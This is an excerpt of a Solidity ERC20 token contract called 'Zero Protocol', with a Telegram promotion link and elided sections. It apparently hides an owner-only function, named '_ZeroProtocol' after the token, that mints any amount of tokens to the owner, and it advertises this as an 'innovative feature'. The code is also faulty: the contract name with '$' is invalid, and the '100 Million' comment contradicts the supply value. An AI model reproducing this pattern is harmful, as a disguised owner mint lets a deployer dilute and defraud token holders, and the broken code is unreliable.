...
//
// $ZeroProtocol proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ZeroProtocolBsc
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ZeroProtocol(uint256 amount) public onlyOwner {
 _ZeroProtocol(msg.sender, amount);
    }
    ...
    function _ZeroProtocol(address account, uint256 amount) internal virtual {
...
contract $ZeroProtocol is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Zero Protocol", "ZP") {
     _ZeroProtocol(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}